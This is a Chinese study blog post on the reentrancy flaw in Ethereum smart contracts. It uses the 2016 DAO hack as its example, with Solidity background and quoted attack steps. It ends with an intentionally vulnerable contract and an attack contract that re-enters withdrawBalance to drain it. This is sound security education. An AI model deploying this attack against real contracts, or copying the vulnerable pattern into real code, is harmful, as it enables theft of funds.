---
title: '#DASP# Reentrancy (1)'
date: 2018-07-20 09:51:56
tags: [BlockChain, DASP]
categories: [区块链]
---

## 0x00 Info

从本篇开始学习智能合约漏洞，依据[DASP TOP10](https://www.dasp.co)。

<!-- more -->

## 0x01 DAO

**History**:  
* [The History of the DAO](https://blog.slock.it/the-history-of-the-dao-and-lessons-learned-d06740f8cfa5)

**WhitePaper**:  
* [WhitePaper](https://download.slock.it/public/DAO/WhitePaper.pdf)
* [白皮书](https://ethfans.org/posts/the-dao-whitepaper)

**OpenSource**:  
* [Github](https://github.com/slockit/dao)
* [etherscan](https://etherscan.io/address/0xbb9bc244d798123fde783fcc1c72d3bb8c189413#code)

### 概念理解

众筹合约，通过资金ETH换取DAO token，从而获得投票和发起议案的权利，按一定规则回馈给投资人投资项目的收益。
因此，The DAO特点：
* 本质是个VC，通过以太坊筹集的资金（ETH）锁定在智能合约中，通过**代码**主导！
* 出资ETH获取对应DAO代币，具有审查项目、投票表决和提出投资项目议案的权利
* 投资议案由全体代币持有人投票表决，一币一票，票数通过，投资项目可获得相应投资额。利用“众智”+出资额权重决定投资策略（取代传统行业投资经理）。
* 投资项目的收益按规则回馈股东。

### The DAO is attacked

[the-dao-the-hack-the-soft-fork-and-the-hard-fork](https://www.cryptocompare.com/coins/guides/the-dao-the-hack-the-soft-fork-and-the-hard-fork/)

```txt
+------------------------+  3.5M ETH lose   +-----------+  DoS vul   +-----------+
| antipattern (withdrew) | ---------------> | soft fork | ---------> | hard fork |
+------------------------+                  +-----------+            +-----------+
```

[security-alert-dos-vulnerability-in-the-soft-fork](https://blog.ethereum.org/2016/06/28/security-alert-dos-vulnerability-in-the-soft-fork/)

## 0x02 Reentrancy

### solidity基础知识

**合约调用**

1. message call
```js
bytes4 funcIdentifier = bytes4(keccak256("FuncName(paramType)"));
this.call(funcIdentifier, paramValue);
```

2. contract object
```js
Contract1 c = Contract1(AddressOfContract1);  
c.foo();
```

**限制**
例如send花费2300gas
递归调用栈最大1024层

**转币**

```js
1. <address>.transfer()    //失败抛出throw且回滚，2300gas
2. <address>.send()    //失败返回false，2300gas
3. <address>.gas().call.vale()()    //失败返回false，所有gas
```

**fallback**

[Solidity的fallback函数](http://me.tryblockchain.org/blockchain-solidity-fallback.html)

```js
contract SimpleFallback{
  function(){
    //fallback function
  }
}
```

两种情况会调用fallback：
1. 调用函数找不到时
2. 向合约发送ether时


### reentrancy & The DAO

DASP TOP10中reentrancy的描述：[dasp](https://www.dasp.co/#item-1)

reentrancy原型为[Race-To-Empty](https://vessenes.com/more-ethereum-attacks-race-to-empty-is-the-real-deal/)，其中就已经介绍了**重置资产**放在**转币**操作后的漏洞。

其中最典型的攻击案例为The DAO。对于The DAO的漏洞分析及利用exp & demo网上一大堆，这里就不ctrlcv了。
> 建议结合源码一起看，并使用本地（truffle+testrpc or geth testnet）或者在线的remix编译环境上手实践。

可以首先看看中文分析：
* [区块链安全 - DAO攻击事件解析](https://paper.seebug.org/544/)
* [以太坊智能合约安全入门](https://paper.seebug.org/601/)

推荐Phil Daian分析：
* [Analysis of the DAO exploit](http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/)

> attack steps:
>   1. Propose a split and wait until the voting period expires. (DAO.sol, createProposal)
>   2. Execute the split. (DAO.sol, splitDAO)
>   3. Let the DAO send your new DAO its share of tokens. (splitDAO -> TokenCreation.sol, createTokenProxy)
>   4. Make sure the DAO tries to send you a reward before it updates your balance but after doing (3). (splitDAO -> withdrawRewardFor -> ManagedAccount.sol, payOut)
>   5. While the DAO is doing (4), have it run splitDAO again with the same parameters as in (2) (payOut -> _recipient.call.value -> _recipient())
>   6. The DAO will now send you more child tokens, and go to withdraw your reward before updating your balance. (DAO.sol, splitDAO)
>   7. Back to (5)!
>   8. Let the DAO update your balance. Because (7) goes back to (5), it never actually will :-).

其中最关键的就是第4步，splitDAO -> withdrawRewardFor -> payOut，其中payOut使用_recipient.call.value(_amount)()转币，而splitDAO函数中资产重置是放在withdrawRewardFor函数后，造成漏洞。

demo & exp：
* [SimpleDAO attack](http://blockchain.unica.it/projects/ethereum-survey/attacks.html#simpledao)
* [reentrancy exp](https://github.com/trailofbits/not-so-smart-contracts/tree/master/reentrancy)

其他合约中的reentrancy漏洞：[CityMayor](https://blog.citymayor.co/posts/how-someone-tried-to-exploit-a-flaw-in-our-smart-contract-and-steal-all-of-its-ether/)
> 特别注意此篇中的分析思路及工具[porosity](https://github.com/comaeio/porosity)/[etherscan](https://etherscan.io/)

---

**漏洞合约：**
```js
contract vulnerable_DAO{
    mapping(address=>uint) userBalances;
    
    function vulnerable_DAO() payable {
    }
    
    function getUserBalance(address user) constant returns(uint) {
        return userBalances[user];
    }
    
    function addToBalance() payable {
        userBalances[msg.sender] += msg.value;
    }
    
    function withdrawBalance() {
        uint amountToWithdraw = userBalances[msg.sender];
        if(msg.sender.call.value(amountToWithdraw)() ==false) {
            throw;
        }
        userBalances[msg.sender] = 0;
    }
    
    function getBalance() returns(uint) {
        return this.balance;
    }
}
```

**攻击利用合约：**
```js
contract Attack {
    address vulnerable_contract;
    uint attackCount;
    address public owner;
    
    function Attack() public{
        attackCount = 2;
        owner = msg.sender;
    }
    
    function() payable{
        while(attackCount>0) {
            attackCount--;
            require(vulnerable_contract.call(bytes4(keccak256("withdrawBalance()"))));
        }
    }
    
    function deposit(address _vulnerable_contract) public payable{
        vulnerable_contract = _vulnerable_contract;
        require(vulnerable_contract.call.value(msg.value)(bytes4(keccak256("addToBalance()"))));
    }
    
    function withdraw(){
        require(vulnerable_contract.call(bytes4(keccak256("withdrawBalance()"))));
    }
    
    function getBalance() returns(uint) {
        return this.balance;
    }
}
```